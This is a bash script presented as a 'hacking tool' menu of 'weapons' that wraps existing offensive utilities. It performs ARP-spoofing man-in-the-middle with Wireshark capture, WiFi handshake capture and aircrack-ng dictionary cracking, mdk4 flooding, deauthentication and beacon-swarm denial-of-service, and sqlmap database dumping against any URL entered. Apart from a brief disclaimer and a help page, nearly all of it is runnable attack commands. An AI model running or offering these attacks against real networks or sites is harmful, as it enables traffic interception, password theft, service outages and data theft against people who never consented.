clear
yellow=$'\e[1;33;40m'
red=$'\e[1;31;40m'
green=$'\e[1;32;40m'
echo "$red"
clear
clear
echo ""
echo "Before We begin you need to make sure you have the following installed"
echo ""
echo "1. mdk4"
echo ""
echo "2. aircrack-ng package"
echo ""
echo "3. nmap"
echo ""
echo "4. wireshark"
echo ""
echo "5. arpspoof"
echo ""
echo "6. gnome-terminal"
echo ""
echo "7. sqlmap"
echo "------------------------------------------"
echo ""
echo ""
echo "Press enter to continue to the home screen"
read sdfgsdfgsdfgjuhasldiuyaetilgghellomanhey
clear
echo ""
echo ""
r=$(( ( RANDOM % 6 )  + 1 ))
if [[ $r == 1 ]]
then
	eye=$'\e[37;1m'
	pupil=$'\e[31;1m'
	e=$'\e[90;1m'
	
	echo "$eye"
	echo "888888888888888888888888888888888888888888888888888888"
	echo "888888888888888888888888     8888888888888888888888888"
	echo "888888888888888888                 8888888888888888888"
	echo "88888888888888                         888888888888888"
	echo "8888888888                                 88888888888"
	echo "88888                 ________                  888888"
	echo "88                   /        \                     88"
	echo "8                   (     0    )                     8"
	echo "88                   \________/                     88"
	echo "88888                                           888888"
	echo "8888888888                                 88888888888"
	echo "88888888888888                         888888888888888"
	echo "888888888888888888                 8888888888888888888"
	echo "888888888888888888888888     8888888888888888888888888"
	echo "888888888888888888888888888888888888888888888888888888"
	echo ""
	echo "                   BECOME A HACKER!                   "
	echo "$red"
fi
if [[ $r == 2 ]]
then
	echo "$green"
	echo "   __________________________"
	echo "  /                         /|"
	echo " /________________________ / |"
	echo "|                         |  |"
	echo "|                         |  |"
	echo "|                         |  |"
	echo "|       YOUR DEVICE       |  |"
	echo "|    HAS BEEN COMPLETLY   |  |"
	echo "|         HACKED!         |  |"
	echo "|                         |  |"
	echo "|                         |  |"
	echo "|                         |  |"
	echo "|                         | /"
	echo "|_________________________|/"
	echo "          |    |"
	echo "        (________)"
	echo ""
	echo ""
	echo "YOU ARE MORE THAN YOU THINK"
	echo "     YOU CAN DO THIS"
	echo ""
fi
if [[ $r == 3 ]]
then
	echo "$yellow"
	figlet "JOKE TIME!"
	echo ""
	echo "What do you call a cold baby pepper?"
	echo "A Little Chili!"
	echo "Now thats funny!"
fi
if [[ $r == 4 ]]
then
	echo "$yellow"
	figlet "JOKE TIME!"
	echo ""
	echo "Knock Knock!"
	echo "Who's There?"
	echo "This is not a Knock Knock Joke. The FBI is taking you away for hacking."
fi
if [[ $r == 5 ]]
then
	echo ""
	echo "$green"
	toilet "YA LIKE    JAZZ!"
fi
if [[ $r == 6 ]]
then
	echo ""
	echo "$yellow"
	echo "5 + 5 = 11"
	echo ""
	echo "See this is why I dont do math. I hack."
fi
echo "$red"
echo ""
echo "=============================================================================="
echo ""
echo "IMPORTANT: I DO NOT OWN ANY RIGHTS TO ANY OF THE PROGRAMS IN THIS SHELL SCRIPT. I DO OWN THE AIR KILLER PROGRAM BUT DO NOT OWN THE PROGRAMS INSIDE OF IT"
echo ""
echo "LEGAL DISCLAMER: THIS PROGRAM IS ONLY TO BE USED FOR A GOOD LEARNING TOOL. NOT TO CAUSE ANY TROUBLE OR TO GET YOUR SELF ARRESTED. IF YOU DO USE THIS FOR BAD THINGS; I THE CREATOR WILL NOT TAKE RESPONSIBILITY."
echo ""
echo ""
reverse=$'\e[1;97;41m'
echo "$reverse"
echo " ____                          ____                       "
echo "|  _ \  __ _ _ __ ___  _ __   / ___|  ___ __ _ _ __ _   _ "
echo "| | | |/ _\ | |_ \ _ \| |_ \  \___ \ / __/ _\ | |__| | | |"
echo "| |_| | (_| | | | | | | | | |  ___) | (_| (_| | |  | |_| |"
echo "|____/ \__,_|_| |_| |_|_| |_| |____/ \___\__,_|_|   \__, |"
echo "                                                    |___/ "
echo " _   _            _    _               _____           _  "
echo "| | | | __ _  ___| | _(_)_ __   __ _  |_   _|__   ___ | | "
echo '| |_| |/ _\ |/ __| |/ / | "_ \ / _\ |   | |/ _ \ / _ \| | '
echo "|  _  | (_| | (__|   <| | | | | (_| |   | | (_) | (_) | | "
echo "|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |   |_|\___/ \___/|_| "
echo "                               |___/                      "
echo ""
echo "$yellow"
echo "Alright Time to choose your weapon!"
echo ""
echo "1. MITM Attack"
echo "2. AirKiller Program (Used for Cracking WiFi passwords)"
echo "3. DOS Attack"
echo "4. Sends deauthentication and disassociation packets"
echo "5. Beacon Swarm"
echo "6. SQL Injection"
echo ""
echo "Type help to go to the help page and learn about how the attacks work and what they do."
echo ""
echo ""
read weapon
if [[ $weapon == "help" || $weapon == "Help" || $weapon == "HELP" ]]
then
        helppg=$'\e[96;42;1m'
        echo "$helppg"
        clear
        echo ""
        echo ""
        echo "HELLO AND WELCOME TO THE HELP PAGE"
        echo "THIS WILL SHOW HOW ALL OF THE ATTACKS WORK AND WHAT THEY DO"
        echo ""
        echo ""
        echo "1. MITM Attack"
        echo "2. AirKiller Program (Used for Cracking WiFi passwords)"
        echo "3. DOS Attack"
        echo "4. Sends deauthentication and disassociation packets"
        echo "5. Beacon Swarm"
        echo "6. SQL Injection"
        echo ""
        echo "Type home to go back home"
        echo ""
        echo ""
        echo "Type the number of the attack you want to learn about."
        read num
	clear
        if [[ $num == "1" ]]
        then
                echo ""
                echo "A man in the middle attack is used to spy on people."
                echo "How they work is actually pretty simple but really cool"
                echo ""
                echo "Basicly how they work is you tell a router that you are the device. Then you tell the device that you are the router."
                echo "So then everything goes through you. But you still let them to connect to each other. Then to spy on them you look at it thorugh wireshark."
                echo ""
                echo ""
                echo "Press enter to go home"
                read akldfhgkljsdhgklslrjkghsrwiwrty856
                bash damnscary.sh 
        fi
        if [[ $num == "2" ]]
        then
                echo ""
                echo "The Air Killer program is a program I made that allows to to crack WiFi passwords"
                echo ""
                echo "When you are trying to crack WiFi passwords you need to find there mac address."
                echo "Then after that you need to get a handshake. A handshake is where a device connects to the network."
                echo "So the program will disconnect everyone from the network then they will automaticly reconnect."
                echo "Then the program will try every password on a 10000 password list and will keep trying intill it gets the password right. This is called bruteforcing."
                echo ""
                echo ""
                echo "Press enter to go home."
                read dkfjhwuit
                bash damnscary.sh
        fi
        if [[ $num == "3" ]]
        then
                echo ""
                echo "A DOS attack stands for Denial Of Service. It diconnects everyone on the network(s)"
                echo ""
                echo "They way it works is pretty simple"
                echo "The computer makes a bunch of fake devices to connect to the network untill the router just cant keep up and it crashes."
                echo "You have to reset the router to fix it. (Unplug the router then plug it back in)"
                echo ""
                echo ""
                echo "Press enter to go home."
                read qwerty
                bash damnscary.sh
        fi
        if [[ $num == "4" ]]
        then
                echo ""
                echo "This attack sends out lots of bad packets that diconnect people"
                echo "You can narrow down the channels, create a blacklist, create a whitelist, and narrow down a specific AP."
                echo ""
                echo ""
                echo "Press enter to go home"
                read sofgiuyjoeihgksn
                bash damnscary.sh
        fi
        if [[ $num == "5" ]]
        then
                echo ""
                echo "Beacon Swarm"
                echo ""
                echo ""
                echo "A beacon swarm is just the way it sounds."
                echo "It sends out a bunch of fake AP's to confuse hackers"
                echo "You can choose from a list, one specific name, or random."
                echo ""
                echo ""
                echo "Press enter to go home"
                read arjedgileh
                bash damnscary.sh
        fi
        if [[ $num == "6" ]]
        then
                echo ""
                echo "SQL Injection"
                echo ""
                echo ""
                echo "SQL injection finds bad spots inside of websites to access the databases inside of it and the information inside of the site."
                echo "It is easy to get caught if you do to a website that is illegal to hack."
                echo "I reccomend this website to hack. It was made to practice hacking on: http://testphp.vulnweb.com/artists.php?artist=1"
                echo ""
                echo ""
                echo "Press enter to go to the home screen"
                read sdfjgkslfg
                bash damnscary.sh
        fi
        if [[ $num == "home" ]]
        then
                bash damnscary.sh
        fi
fi

if [[ $weapon == "1" ]]
then
	echo "Do want to run Nmap or do you already have the IP address? ( nmap or ip )"
	read nmap
	if [[ $nmap == "nmap" ]]
	then
		echo ""
		echo ""
		echo "What is your Router IP? Include the /amountOfIPs"
		read ip
		clear
		echo "Do you want to avoid the firewall?"
		read fire
		if [[ $fire == "yes" ]]
		then
			sudo nmap -sS $ip
		elif [[ $fire == "no" ]]
		then
			sudo nmap -sP $ip
		fi
	else
		echo "Ok then. I guess you are just too smart for nmap huh."
		echo ""
		echo ""
	fi
		echo ""
		echo "What is your IP you are attacking?"
		read victim
		clear
		iwconfig
		echo "What is your Wireless card?"
		read card
		clear
		echo "What Is the IP for the router without the /amountOfIPs"
		read ipn
		clear
		sudo gnome-terminal --command "sudo arpspoof -i $card -t $ipn $victim"
		echo ""
		echo "Press enter to move on. When You are ready analyze stuff with wireshark. (It is ran as root just so you know)"
		read edrfgwsdfghs
		sudo wireshark
		echo ""
		end=$'\e[5;97;41m'
		echo "$end"
		echo "Press enter to go to home screen"
		read sidfhgksjldfhkgjls
		bash damnscary.sh
fi
if [[ $weapon == "2" ]]
then
	clear
yellow=$'\e[1;33m'
red=$'\e[1;31m'
green=$'\e[1;32m'
yes="yes"
no="no"
echo 'I DO NOT OWN RIGHTS TO NEITHER THE PASSWORD LIST NOR AIRCRACK-NG'
echo ''
echo "$yellow "
echo "    _    _        _  ___ _ _           "
echo "   / \  (_)_ __  | |/ (_) | | ___ _ __ "
echo "  / _ \ | | '__| | ' /| | | |/ _ \ '__|"
echo " / ___ \| | |    | . \| | | |  __/ |   "
echo "/_/   \_\_|_|    |_|\_\_|_|_|\___|_|   "
echo "                                       "
echo ''
echo 'Install Aircrack-ng package?'
read a
if [[ $a == $yes ]] 
then
	sudo apt install aircrack-ng
elif [[ $a == $no ]] 
then
	echo 'Ok!'
fi
clear
echo ''
iwconfig
echo ' what is your wireless card name?: '
read x
echo ''
echo 'Do you want to put it into monitor mode?: '
read p
if [[ $p == $yes ]]
then
	clear
	sudo airmon-ng start $x
	clear
	iwconfig
	echo ''
	echo 'What is your new wireless card name?'
	read x
elif [[ $p == $no ]]
then
	clear
	echo 'Ok!'
fi
clear
echo ' running airodump-ng'
echo ''
echo ' Press ctrl+c to stop when you found a handshake'
echo "$green"
sudo airodump-ng $x
echo "$yellow what is your bssid?: "
read y
clear
echo ''
echo ' Injecting packets'
echo "$green"
sudo besside-ng -b $y $x
clear
echo "$yellow Do you want to view the handshake?"
read f
if [[ $f == $yes ]]
then
	cat besside.log
	echo ''
	echo 'Type yes when you want to move on'
	read f
	if [[ $f == $yes ]]
	then
		echo 'Well Then! Lets Crack some passwords!'
	fi
elif [[ $f == $no ]]
then
	echo 'Well Then! Lets Crack some passwords!'
fi
echo ' Cracking password'
echo "$green"
sudo aircrack-ng -w CommonPasswords wpa.cap
echo ''
echo "$yellow There you go!"
echo "$red"
echo 'Delete besside.log, wpa.cap, wep.cap?: '
read d
if [[ $d == $yes ]]
then
	echo 'Removing Files'
	sudo rm wpa.cap
	sudo rm wep.cap
	sudo rm besside.log
elif [[ $d == $no ]]
then
	echo 'Keeping files'
fi
echo "$yellow"
echo ''
echo ' good bye!'
end=$'\e[5;97;41m'
echo "$end"
echo ""
echo ""
echo "Press enter to go to home screen"
read sdfhgsjdfgsg
bash damnscary.sh
elif [[ $weapon == "3" ]]
then
	clear
	echo "$green"
	iwconfig
	echo ''
	echo "What is your wireless card?"
	read card
	echo ""
	echo "Do you want to put it into monitor mode?"
	read mon
	if [[ $mon == "yes" ]]
	then
		sudo airmon-ng start $card
		clear
		echo "What is your new wireless card?"
		read card
	fi
	clear
	echo "Do you want to scan for networks and mac address'?"
	read dump
	if [[ $dump == "yes" ]]
	then
		sudo airodump-ng $card
		echo "$green"
	fi
	echo "Do you want to specify a BSSID?"
	read b
	if [[ $b == "yes" ]]
	then
		echo "What is it?"
		read bssid
		clear
	fi
	clear
	final="sudo mdk4 $card a"
	echo "Press Enter to begin DOS Attack and use CTRL+C to stop it"
	read sdojfgskldfghl
	if [[ $bssid != "" ]]
	then
		final=$final" -a $bssid"
	fi
	$final
	echo ""
	echo "Press enter to go to home screen"
	read qwertyuilkjhgfdxcv
	bash damnscary.sh
fi
if [[ $weapon == "4" ]]
then
	clear
	iwconfig
	echo "$red"
	echo "What is your wireless card?"
        read card
        echo ""
        echo "Do you want to put it into monitor mode?"
        read mon
        if [[ $mon == "yes" ]]
        then
                sudo airmon-ng start $card
                clear
		iwconfig
		echo ""
                echo "What is your new wireless card?"
                read card
        fi
        clear
	echo "$red"
	echo "Do you want to scan for WiFi networks and mac's?"
	read scan
	if [[ $scan == "yes" ]]
	then
		sudo airodump-ng $card
		echo "$red"
	fi
	echo "Do you want to include a specified AP BSSID?"
	read b
	if [[ $b == "yes" ]]
	then
		echo "What is it?"
		read bssid
	fi
	echo ""
	echo "Do you want to create a blacklist of targets?"
	read t
	if [[ $t == "yes" ]]
	then
		echo ""
		nano blacklist.txt
		clear
		echo "$red"
	elif [[ $t == "no" ]]
	then
		echo ""
		echo "Do you want to create a whitlist for non-targets?"
		read w
		if [[ $w == "yes" ]]
		then
			echo ""
			nano whitelist.txt
			echo "$red"
		fi
	fi
	clear
	echo ""
	echo "Do you want to specifiy a channel(s)"
	read c
	if [[ $c == "yes" ]]
	then
		clear
		echo ""
		echo "What are they? If there is more then one seperate them by just one comma."
		read channels
		clear
	fi
	din="sudo mdk4 $card d"
	if [[ $channels != "" ]]
	then
		din=$din" -c $channels"
	fi
	if [[ $bssid != "" ]]
	then
		din=$din" -B $bssid"
	fi
	if [[  $t == "yes" ]]
	then
		din=$din" -b blacklist.txt"
	fi
	if [[ $w == "yes" ]]
	then
		din=$din" -w whitelist.txt"
	fi
	echo ""
	echo "When you are ready press enter and press CTRL+C to stop"
	read sdfjklghsdfgh
	$din
	echo ""
	echo "Press enter to go back to home screen"
	read iqweyrqiuhgshdfkjghdhn
	bash damnscary.sh
fi
if [[ $weapon == "5" ]]
then
	blue=$'\e[1;34m'
	clear
	echo "$blue"
	echo ""
	iwconfig
	echo ""
	echo "What is your wireless card?"
        read card
        echo ""
        echo "Do you want to put it into monitor mode?"
        read mon
        if [[ $mon == "yes" ]]
        then
                sudo airmon-ng start $card
                clear
		iwconfig
		echo ""
                echo "What is your new wireless card?"
                read card
        fi
        clear
	echo ""
	echo "Do you want to specify a SSID you want to use?"
	read bid
	if [[ $bid == "yes" ]]
	then
		echo ""
		echo "What is it?"
		read ib
		clear
	fi
	if [[ $ib == "" ]]
	then
		echo ""
		echo "Do you want to use a SSID list?"
		read s
		if [[ $s == "yes" ]]
		then
			echo ""
			echo "1. Use the SSID list that came with the github package"
			echo "2. Use your own SSID list"
			read list
			if [[ $list == "1" ]]
			then
				echo ""
				echo "Ok then we are going to use the SSID list that came with the package"
			elif [[ $list == "2" ]]
			then
				echo ""
				echo "What is the location of the list?"
				read lisdir
            fi
		fi
	fi
	clear
	echo ""
	echo ""
	beacon="sudo mdk4 $card b"
	if [[ $ib != "" ]]
	then
		beacon=$beacon" -n $ib"
	fi
	if [[ $s != "" ]]
	then
		if [[ $list == "1" ]]
		then
			beacon=$beacon" -f CommonSSIDs"
		elif [[ $list == "2" ]]
		then
			beacon=$beacon" -f $lisdir"
		fi
	fi
	echo ""
	echo "I reccomend monitoring everything. So do you want to?"
	read term
	if [[ $term == "yes" ]]
	then
		echo ""
		sudo gnome-terminal --command "sudo airodump-ng $card"
	fi
	echo "Press the enter button to begin beacon swarm. Be careful! If you run it too long it can crash your computer!"
	read beaconswarmonstart
	$beacon
	echo ""
	echo "Press enter to go to home screen"
	read ajfdgkadhfgjklsdfg
	bash damnscary.sh
fi
if [[ $weapon == "6" ]]
then
	clear
	sql=$'\e[1;33;44m'
	echo "$sql"
	clear
	clear
	echo "$sql"
	echo "Ok Lets jump right into it!"
	echo ""
	echo "What URL are you attacking?"
	read url
	clear
	sudo sqlmap -u $url --dbs
	echo "$sql"
	echo "What database to you want to go into?"
	read dbs
	clear
	sudo sqlmap -u $url -D $dbs --tables
	echo "$sql"
	echo "What table do you want to go into?"
	read table
	clear
	sudo sqlmap -u $url -D $dbs -T $table --columns
	echo "$sql"
	echo "What column to you want to go into?"
	read column
	clear
	sudo sqlmap -u $url -D $dbs -T $table -C $column --dump
	echo "$sql"
	echo "Well There you go!"
	echo "Press enter to go to home screen"
	read hellomanhowisitgoingthanksforreadingthiscode
	bash damnscary.sh
fi










